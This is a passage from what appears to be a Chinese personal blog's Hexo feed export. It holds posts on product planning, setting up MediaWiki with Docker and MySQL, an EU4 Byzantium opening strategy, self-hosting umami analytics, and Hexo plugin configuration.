src="https://cos.gjcloak.xyz/pigo/202210131630569.png?imageMogr2/format/webp/interlace/1/quality/80"></p><p>同时随着资历的加深，我们越来越多的在分析和解答哪些不明确&#x2F;不具体的产品问题，甚至要去发现问题和新机会。</p><p>这些都可以通过产品规划帮助我们完成。</p><p><img src="https://cos.gjcloak.xyz/pigo/202210131631590.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h2 id="产品规划两大关键"><a href="#产品规划两大关键" class="headerlink" title="产品规划两大关键"></a>产品规划两大关键</h2><h3 id="定目标"><a href="#定目标" class="headerlink" title="定目标"></a>定目标</h3><p>设定什么样的目标，也就决定产品后续方向，并且要进行目标沟通，让大家认同目标，齐心协力往前走。</p><h3 id="找路径"><a href="#找路径" class="headerlink" title="找路径"></a>找路径</h3><p>为达成目标，往往涉及多人分工合作，并且有节奏感，各个阶段里程碑达到什么状态。本质是以终为始的底层逻辑，先确定目标，然后看为达成目标，用什么方法拆解落地。</p><h2 id="产品规划6步法"><a href="#产品规划6步法" class="headerlink" title="产品规划6步法"></a>产品规划6步法</h2><h3 id="产品现状梳理、复盘"><a href="#产品现状梳理、复盘" class="headerlink" title="产品现状梳理、复盘"></a>产品现状梳理、复盘</h3><p>我们梳理、复盘的目的是什么？去整理他的基本面从而构建一个体系出来。这个过程一定是从模糊到具体、从主干到枝叶、枝叶不断细化的过程。做这个事情有两类关键性手段：一类是定量，通过数据分析，了解产品基本面、关键指标的表现，透过现象看本质。一类是定性，用户访谈，通过用户的声音，了解这个产品现状。</p><p>最后，我们对这件事期望的结果是什么？一个是要抓住产品有哪些问题，认清薄弱点；二个是要抓出产品有哪些经验做得好的地方；</p><p>试着提问自己：</p><ul><li>负责的产品中，能抽象出那些关键的方向？</li><li>这些方向里面包含了哪些关键要点和节点</li><li>这些要点和节点，如何数据量化其表现？</li><li>通过这些数据表现，哪些方面做的不及预期，哪些方面做的很优秀？</li></ul><h3 id="用户场景和需求"><a href="#用户场景和需求" class="headerlink" title="用户场景和需求"></a>用户场景和需求</h3><p>为什么要重点研究用户场景和需求？</p><p>这是产品内核，产品价值的落脚点。</p><p>用户场景和需求是持续变化的。以获取信息的渠道为例，从报纸杂志-&gt; 门户网站、博客-&gt; 微博—&gt;头条-&gt;微信公众号-&gt;短视频。</p><p>随着场景和需求的不断变化，产品也在顺需迭代而变；试着提问自己：</p><ul><li>用户场景有没有发生变化？</li><li>有哪些用户场景需求，没有被很好的满足？</li></ul><h3 id="行业的变化"><a href="#行业的变化" class="headerlink" title="行业的变化"></a>行业的变化</h3><p>行业的视角分为两个方面：</p><p>我们要对同赛道产品足够熟悉，所谓‘知己知彼，百战不殆’；</p><p>同时对内关注兄弟产品变化，借鉴和参考，保持心态开放，求知若渴。试着提问自己：</p><ul><li>市面上哪些跟我负责的同赛道的产品，各自的优势是什么？</li><li>相比去年，赛道内有什么逐步形成的新趋势？</li><li>公司内与我负责产品有关联或者相近的兄弟产品，近期有哪些新线条或新模式?</li></ul><h3 id="部门-业务的方向"><a href="#部门-业务的方向" class="headerlink" title="部门&#x2F;业务的方向"></a>部门&#x2F;业务的方向</h3><p>从事教育行业产品后，发现与互联网行业产品不太一样；不一样的地方在于我们其实不是这个业务线的最上游。</p><p>互联网行业做产品，你最懂用户，你是最上游，大家都是跟着产品的思路去走；</p><p>但是教育行业里，最懂学生和家长的不是我们，我们要看上游业务思路和方向，紧密围绕业务方的主航道。及时获取、消化自上而下的战略思考和顶层设计。试着提问自己：</p><ul><li>我有多久没跟业务侧聊聊，最近他们最关注什么？</li><li>业务侧最核心的指标是什么？我们的产品在哪些点上和这些指标强相关</li><li>我负责的产品，哪些部分是和业务方向紧密相关？</li></ul><h3 id="总结问题、明确目标"><a href="#总结问题、明确目标" class="headerlink" title="总结问题、明确目标"></a>总结问题、明确目标</h3><p>前四步是个发散的过程，帮助我们去寻找问题。这一步是综合收敛过程，把所有信息整合一起，提炼要解决的重大核心问题，问题就是切入点，问题出来了，你会发现，目标也就出来了。</p><h3 id="制定里程碑"><a href="#制定里程碑" class="headerlink" title="制定里程碑"></a>制定里程碑</h3><p>前五步都属于第一个关键点，找目标。</p><p>制定里程碑是第二个关键点：找路径。</p><p>里程碑的意义，让团队有目标感、节奏感，知道在什么时间点，完成什么大事儿。</p><p>每个版本里，有一个主旋律，突出重点。定期和团队review里程碑达成情况，避免虎头蛇尾。试着提问自己：</p><ul><li>计划要做的所有事，哪些是构成最小MVP闭环所不可缺少的？</li><li>要做的事有几条线，每个版本的主旋律是什么？一张图看清楚，2大关键路径与6步法的关系</li></ul><p><img src="https://cos.gjcloak.xyz/pigo/202210131636052.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>产品规划，是多少产品经理的痛；</p><p>产品的三个阶段，支撑业务、驱动业务、引领业务，而做到驱动业务、引领业务又是多少产品经理的夙愿；</p><p>掌握产品规划背后的套路，成为我们不断进阶的利器。今天分享做产品规划2大关键环节，6大步法：</p><ol><li><p>2大关键环节：定目标、找路径</p></li><li><p>6步法：</p><ul><li>产品现状梳理和复盘</li><li>用户变化（用户场景和需求）</li><li>行业变化</li><li>部门&amp;业务方向变化</li><li>总结问题，明确目标</li><li>制定里程碑</li></ul></li></ol><p>最后，分享一份规划思路总结</p><p><img src="https://cos.gjcloak.xyz/pigo/202210131637754.png?imageMogr2/format/webp/interlace/1/quality/80"></p>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 产品经理 </tag>
            
            <tag> 产品规划 </tag>
            
            <tag> 知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker搭建MediaWiki</title>
      <link href="/143.html"/>
      <url>/143.html</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>MediaWiki 是 Wikipedia 使用的网站解决方案的开源版，以个人观点来看，Wiki 在这个时代显得不够时尚，且不支持 MarkDown 等新兴的标记语言，另外页面的组织方式采用了自己的一套管理语言，上手需要一定的学习成本。不过经典总归是经典。</p><p>MediaWiki 也提供了官方的 Docker image，这就节省了不少安装环境的工作量，接下来就来看看私有 MediaWiki 站点是如何搭建起来的吧。</p><h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>操作系统：Debian 10.2 64bit</p><p>配置：1核2G</p><p>Docker管理器：3.9.1</p><p>PHP：7.4.30</p><p>本文采用docker部署一套MediaWiki</p><h2 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h2><p>请查看 <a href="https://docs.docker.com/compose/install/">官网</a></p><h2 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /data</span><br><span class="line">mkdir -p /data/mediawiki</span><br><span class="line">mkdir -p /data/mysql</span><br><span class="line"></span><br><span class="line">docker pull mysql:5.7</span><br><span class="line"></span><br><span class="line">docker run -itd -p 3306:3306 --name wiki-mysql -e MYSQL_ROOT_PASSWORD=123456 --restart=always --restart=on-failure:1 --oom-score-adj -1000 --privileged=true --log-opt max-size=10m --log-opt max-file=1 -v /data/mysql:/var/lib/mysql  mysql:5.7</span><br></pre></td></tr></table></figure><p>创建数据库以及用户，并开启远程连接权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># docker exec -it wiki-mysql /bin/bash</span><br><span class="line"></span><br><span class="line">root@4a6eaab770c5:/# mysql -p123456</span><br><span class="line">mysql&gt; create database my_wiki;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create user &#x27;wikiuser&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; grant all privileges on my_wiki.* to &#x27;wikiuser&#x27;@&#x27;%&#x27; with grant option;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; exit</span><br><span class="line"></span><br><span class="line">root@4a6eaab770c5:/# exit</span><br></pre></td></tr></table></figure><h2 id="安装MediaWiki"><a href="#安装MediaWiki" class="headerlink" title="安装MediaWiki"></a>安装MediaWiki</h2><p>MediaWiki 需要依赖于 MySQL，所以要先启动 MySQL，再启动 MediaWiki，不然启动会失败。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull mediawiki:1.31.1</span><br><span class="line">docker run -itd --name mywiki -p 8080:80 --privileged=true --restart=always --link wiki-mysql:mysql mediawiki:1.31.1</span><br></pre></td></tr></table></figure><h2 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置"></a>初始化配置</h2><p>打开浏览器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP+端口/mediawiki/index.php</span><br></pre></td></tr></table></figure><p>开始初始化配置</p><p><img src="https://cos.gjcloak.xyz/pigo/202209301149689.png?imageMogr2/format/webp/interlace/1/quality/80" alt="开始设置.png" title="开始设置.png"></p><p>语言设置</p><p><img src="https://cos.gjcloak.xyz/pigo/202209301149083.png?imageMogr2/format/webp/interlace/1/quality/80" alt="语言设置.png" title="语言设置.png"></p><p>环境检查</p><p><img src="https://cos.gjcloak.xyz/pigo/202209301150652.png?imageMogr2/format/webp/interlace/1/quality/80" alt="环境检查.png" title="环境检查.png"></p><p>选择mysql，注意：修改ip地址为mysql的容器IP，使用 ‘docker inspect [容器id或名称]‘ 进行查看容器IP。数据库用户：wikiuser，密码：123456</p><p><img src="https://cos.gjcloak.xyz/pigo/202209301150978.png?imageMogr2/format/webp/interlace/1/quality/80" alt="数据库设置.png" title="数据库设置.png"></p><p>选择数据库引擎为InnoDB，新版本可不用选择</p><p><img src="https://cos.gjcloak.xyz/pigo/202209301150098.png?imageMogr2/format/webp/interlace/1/quality/80" alt="数据库引擎.png" title="数据库引擎.png"></p><p>设置全局名称和添加管理员</p><p>密码：必须8位以上，且符合复杂性要求</p><p><img src="https://cos.gjcloak.xyz/pigo/202209301151167.png?imageMogr2/format/webp/interlace/1/quality/80" alt="设置账号密码.png" title="设置账号密码.png"></p><p>正式安装</p><p><img src="https://cos.gjcloak.xyz/pigo/202209301151181.png?imageMogr2/format/webp/interlace/1/quality/80" alt="正式安装.png" title="正式安装.png"></p><p>安装完成</p><p><img src="https://cos.gjcloak.xyz/pigo/202209301151917.png?imageMogr2/format/webp/interlace/1/quality/80" alt="安装完成.png" title="安装完成.png"></p><p>注意：页面会自动下载一个 <code>LocalSettings.php</code></p><p>注意：先不要点击 进入您的wiki，还查一个步骤，否则会出错的。</p><p>登录到服务器，将 <code>LocalSettings.php</code> 上传到服务器，比如：<code>/tmp目录</code></p><p>将 <code>LocalSettings.php</code> 复制到容器中的wiki根目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp LocalSettings.php mywiki:/var/www/html/</span><br></pre></td></tr></table></figure><p>点击 上图中的 进入您的wiki</p><p>它会调转链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://IP:端口/index.php/首页</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://cos.gjcloak.xyz/pigo/202209301151885.png?imageMogr2/format/webp/interlace/1/quality/80" alt="首页.png" title="首页.png"></p><h2 id="网页持久化配置"><a href="#网页持久化配置" class="headerlink" title="网页持久化配置"></a>网页持久化配置</h2><p>目前的php代码在容器里面，一旦重启，数据就丢失了。</p><p>复制网页目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp mywiki:/var/www/html /data/mediawiki/</span><br></pre></td></tr></table></figure><p>杀掉docker，以新的方式启动。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm -f mywiki</span><br><span class="line">docker run -itd --name mywiki -p 8080:80 -v /data/mediawiki/html:/var/www/html --privileged=true --restart=always --link wiki-mysql:mysql  mediawiki:1.31.1</span><br></pre></td></tr></table></figure><p>再次刷新页面，效果同上！</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> MediaWiki </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拜占庭（Byzantium）1444年破局思路分享（v1.34.3）</title>
      <link href="/1bc82aef.html"/>
      <url>/1bc82aef.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>分享在游戏中1444年开局扮演拜占庭国家破局奥斯曼对君士坦丁堡的进攻的思路，保姆级教学，如果你有更好的方案或是有意见和建议都可以在评论区提出。</p></blockquote><h2 id="战前准备"><a href="#战前准备" class="headerlink" title="战前准备"></a>战前准备</h2><ol><li>开局贷款造3艘重型船</li><li>改善瓦拉几亚、阿尔巴尼亚、伊梅列季的关系、结盟。联姻只与伊梅列季联姻，伊梅列季的君主很老，没有继承人，有概率联统，其他两个都是将来要打的国家。</li><li>等到可以宣战的时候先吃掉伊庇鲁斯，他一般不会结盟其他国家。</li><li>贷款造到有12K步兵，再造自由佣兵团雇佣兵，避免被奥斯曼第一个宣战。</li><li>等待奥斯曼向东方更弱的卡拉曼、詹达尔宣战。</li><li>当奥斯曼对以上东巴尔干国家宣战时，将所有军队转移到君堡，将所有舰队整合加提督放在君堡海峡中间，确认没有奥斯曼舰队也一样在海峡中间时、确认奥斯曼将所有军队调集到东方后，对奥斯曼宣战。</li></ol><div class="note info modern"><p>注意：开战不要拉盟友！开战不要拉盟友！开战不要拉盟友！开战不要拉盟友！开战不要拉盟友！<br>盟友只是为了防止被奥斯曼第一个宣战所做的准备，不需要拉入战争分钱、占地、送分。</p></div><h2 id="对奥斯曼开战"><a href="#对奥斯曼开战" class="headerlink" title="对奥斯曼开战"></a>对奥斯曼开战</h2><p>宣战理由如图所示 （再次提醒<mark class="hl-label red">不要拉盟友开战</mark> ）</p><p><img src="https://cos.gjcloak.xyz/pigo/202308021833247.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>开战后，如果军事顾问有加陆军士气的可以带一个</p><p>调集军队从君堡直接攻入如图所示该省份，该城市是东西巴尔干自由通行的通道，只要强攻成功，奥斯曼便不可能进入西巴尔干，如图过程大致为，通过舰队炮击攻破城墙，等待拆塔的进度条过一层，就开始强攻拆塔，舰队加成+拆墙+拆一层进度条+强攻基本能稳拿下，如果后续版本有改动可以试试求稳拆两层进度条（两层的话奥斯曼会有充足时间调军队来救驾，你只能赌Ai不鸟你…）</p><p><img src="https://cos.gjcloak.xyz/pigo/202308021836556.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p><img src="https://cos.gjcloak.xyz/pigo/202308021836478.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p><img src="https://cos.gjcloak.xyz/pigo/202308021837303.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>然后就开始踩地，每次拆完塔记得把占领的敌方堡垒也一起关了（方法如图红圈所示），保护穷酸的经济。</p><p><img src="https://cos.gjcloak.xyz/pigo/202308021837294.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>再然后打开经济地图的劫掠模式，把军队的支出调到最低，关掉堡垒，开始踩地劫掠等待随时间上升的25点战争分数刷满。</p><p><img src="https://cos.gjcloak.xyz/pigo/202308021838006.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>吃地推荐按照任务树吃，跑出来几块和塞尔维亚接壤就行</p><p><img src="https://cos.gjcloak.xyz/pigo/202308021838584.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p><img src="https://cos.gjcloak.xyz/pigo/202308021839747.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><h2 id="战后展望"><a href="#战后展望" class="headerlink" title="战后展望"></a>战后展望</h2><p>打完奥斯曼以后你的实力应该足以和莫斯科结盟联姻，迅速和莫斯科结盟以防被匈牙利和威尼斯侵略，通过新版本的人情系统，多发展和莫斯科的外交关系就能在他变身俄罗斯的时候联统他。</p><p>远交近攻，积攒奥地利的人情，让他帮你打下威尼斯和意大利，在奥地利为你正面作战透支人力后取消盟约联合勃拉登堡等新盟友背刺奥地利，把奥地利设为宿敌开始拉法兰西好感度，以此类推。</p><p>当已经第二次&#x2F;第三次对奥斯曼战争，判断奥斯战后足够虚弱的时候，记得如下图所示把和马穆鲁克与奥斯曼接壤后路封上，确保独吞奥斯曼版图果实，刚刚恢复对巴尔干控制的拜占庭还不足以正面对抗马穆鲁克。</p><p><img src="https://cos.gjcloak.xyz/pigo/202308021839153.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>然后跟着任务树走就能愉快的重建罗马啦！</p><p><img src="https://cos.gjcloak.xyz/pigo/202308021840561.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p><img src="https://cos.gjcloak.xyz/pigo/202308021841467.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p><img src="https://cos.gjcloak.xyz/pigo/202308021841511.webp?imageMogr2/format/webp/interlace/1/quality/0"></p><p>攻略到此结束，希望你能够满意，喜欢的话点个赞吧！如果你有疑问或更好的建议，欢迎在评论区留言。</p>]]></content>
      
      
      <categories>
          
          <category> P社 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> EU4 </tag>
            
            <tag> 思路 </tag>
            
            <tag> 拜占庭 </tag>
            
            <tag> 破局 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用umami搭建免费的个人博客数据统计系统</title>
      <link href="/135.html"/>
      <url>/135.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>Umami 是一个简单、易于使用、自托管的网络分析解决方案。目标是为您提供一个更友好、注重隐私的 Google Analytics 替代方案，以及一个免费、开源的付费解决方案替代方案。Umami 只收集您关心的指标，所有内容都放在一个页面上。</p></blockquote><p>官网推荐的安装方式有两种，第一种是源码运行在本机环境的，第二种是使用docker进行运行。这里我使用的是第一种方法</p><h2 id="运行要求"><a href="#运行要求" class="headerlink" title="运行要求"></a>运行要求</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">官网要求：</span><br><span class="line">Node.js &gt;= 12</span><br><span class="line">MySQL或Postgresql数据库</span><br><span class="line"></span><br><span class="line">站长安装使用环境：</span><br><span class="line">操作系统：Debian 10.2 64bit</span><br><span class="line">宝塔：7.9.2</span><br><span class="line">Node.js版本：v16.15.1</span><br><span class="line">数据库：Mysql</span><br></pre></td></tr></table></figure><p>关于node.js和数据库的安装我这里就不赘述了，都很简单，在此默认都是安装好的情况下来安装umami</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/mikecao/umami.git</span><br><span class="line">cd umami</span><br><span class="line">yarn install</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>创建 <code>.env</code> 文件，填入以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DATABASE_URL=(connection url)</span><br></pre></td></tr></table></figure><p>其中 <code>(connection url)</code> 的链接格式如下（填入记得去掉括号，我就在这里踩了坑）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">postgresql://username:mypassword@localhost:5432/mydb</span><br><span class="line"></span><br><span class="line">mysql://username:mypassword@localhost:3306/mydb</span><br></pre></td></tr></table></figure><p><code>username</code> 为数据库用户名<br><code>mypassword</code> 为数据库密码<br><code>localhost:3306</code> 为数据库链接地址加端口<br><code>mydb</code> 为数据库名称</p><h2 id="构建应用程序"><a href="#构建应用程序" class="headerlink" title="构建应用程序"></a>构建应用程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn build</span><br></pre></td></tr></table></figure><h2 id="创建数据库表"><a href="#创建数据库表" class="headerlink" title="创建数据库表"></a>创建数据库表</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn update-db</span><br></pre></td></tr></table></figure><p>执行完语句，你会发现在数据库里多了几张表，并且创建一个登录帐户（用户名&#x2F;密码：admin&#x2F;umami）</p><h2 id="启动程序"><a href="#启动程序" class="headerlink" title="启动程序"></a>启动程序</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn start</span><br></pre></td></tr></table></figure><p>默认情况下，端口为3000，可以使用<a href="http://localhost:3000/">http://localhost:3000</a>进行访问<br><img src="https://cos.gjcloak.xyz/pigo/202207210927727.png?imageMogr2/format/webp/interlace/1/quality/80"><br>使用默认账号密码登录后，界面如下<br><img src="https://cos.gjcloak.xyz/pigo/202207210926655.png?imageMogr2/format/webp/interlace/1/quality/80"><br>点击头像旁边的按钮设置中文语言<br><img src="https://cos.gjcloak.xyz/pigo/202207210928441.png?imageMogr2/format/webp/interlace/1/quality/80"><br><img src="https://cos.gjcloak.xyz/pigo/202207210929766.png?imageMogr2/format/webp/interlace/1/quality/80"><br>最后在使用反代即可通过域名访问umami了，到这里便完成了安装</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> umami </tag>
            
            <tag> 数据统计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>置顶轮播图</title>
      <link href="/116.html"/>
      <url>/116.html</url>
      
        <content type="html"><![CDATA[<p>效果如下图<br><img src="https://cos.gjcloak.xyz/pigo/202209241514899.png?imageMogr2/format/webp/interlace/1/quality/80"></p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>在博客根目录下，执行安装代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-butterfly-swiper --save</span><br></pre></td></tr></table></figure><h2 id="添加配置信息"><a href="#添加配置信息" class="headerlink" title="添加配置信息"></a>添加配置信息</h2><p>在博客的 <code>_config.yml</code> 或者主题配置文件 <code>_config.butterfly.yml</code> 里添加配置信息</p><p>{cat_hide}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># hexo-butterfly-swiper</span><br><span class="line"># see https://akilar.top/posts/8e1264d1/</span><br><span class="line">swiper:</span><br><span class="line">  enable: true # 开关</span><br><span class="line">  priority: 5 #过滤器优先权</span><br><span class="line">  enable_page: all # 应用页面</span><br><span class="line">  timemode: date #date/updated</span><br><span class="line">  layout: # 挂载容器类型</span><br><span class="line">    type: id</span><br><span class="line">    name: recent-posts</span><br><span class="line">    index: 0</span><br><span class="line">  default_descr: 再怎么看我也不知道怎么描述它的啦！</span><br><span class="line">  swiper_css: https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css #swiper css依赖</span><br><span class="line">  swiper_js: https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js #swiper js依赖</span><br><span class="line">  custom_css: https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css # 适配主题样式补丁</span><br><span class="line">  custom_js: https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js # swiper初始化方法</span><br></pre></td></tr></table></figure><p>{&#x2F;cat_hide}</p><h2 id="参数释义"><a href="#参数释义" class="headerlink" title="参数释义"></a>参数释义</h2><p>参数</p><p>备选值&#x2F;类型</p><p>释义</p><p>priority</p><p>number</p><p>【可选】过滤器优先级，数值越小，执行越早，默认为10，选填</p><p>enable</p><p>true&#x2F;false</p><p>【必选】控制开关</p><p>enable_page</p><p>path&#x2F;all</p><p>【可选】填写想要应用的页面的相对路径（即路由地址）,如根目录就填’&#x2F;‘,分类页面就填’&#x2F;categories&#x2F;‘。若要应用于所有页面，就填’all’，默认为all</p><p>timemode</p><p>date&#x2F;updated</p><p>【可选】时间显示，date为显示创建日期，updated为显示更新日期,默认为date</p><p>layout.type</p><p>id&#x2F;class</p><p>【可选】挂载容器类型，填写id或class，不填则默认为id</p><p>layout.name</p><p>text</p><p>【必选】挂载容器名称</p><p>layout.index</p><p>0和正整数</p><p>【可选】前提是layout.type为class，因为同一页面可能有多个class，此项用来确认究竟排在第几个顺位</p><p>default_descr</p><p>text</p><p>默认文章描述</p><p>swiper_css</p><p>url</p><p>【可选】自定义的swiper依赖项css链接</p><p>swiper_js</p><p>url</p><p>【可选】自定义的swiper依赖项加js链接</p><p>custom_css</p><p>url</p><p>【可选】适配主题样式补丁</p><p>custom_js</p><p>url</p><p>【可选】swiper初始化方法</p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>在文章的 <code>front_matter</code> 中添加 <code>swiper_index</code> 配置项即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章标题</span><br><span class="line">date: 创建日期</span><br><span class="line">updated: 更新日期</span><br><span class="line">cover: 文章封面</span><br><span class="line">description: 文章描述</span><br><span class="line">swiper_index: 1 #置顶轮播图顺序，非负整数，数字越大越靠前</span><br><span class="line">---</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 轮播图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>生成文章唯一链接</title>
      <link href="/112.html"/>
      <url>/112.html</url>
      
        <content type="html"><![CDATA[<p>Hexo的默认文章链接格式是年，月，日，标题这种格式来生成的。如果你的标题是中文的话，那你的URL链接就会包含中文。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">permalink: :year/:month/:day/:title</span><br></pre></td></tr></table></figure><p>前往你的Hexo博客根目录，打开cmd命令窗口执行 <code>npm install hexo-abbrlink --save</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure><p>修改站点配置文件 <code>_config.yml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- permalink: :year/:month/:day/:title/</span><br><span class="line">#修改为</span><br><span class="line">+ permalink: post/:abbrlink.html # post为自定义前缀</span><br><span class="line">+ abbrlink:</span><br><span class="line">+   alg: crc32   #算法： crc16(default) and crc32</span><br><span class="line">+   rep: hex     #进制： dec(default) and hex</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 文章链接 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提高学习效率的策略</title>
      <link href="/27.html"/>
      <url>/27.html</url>
      
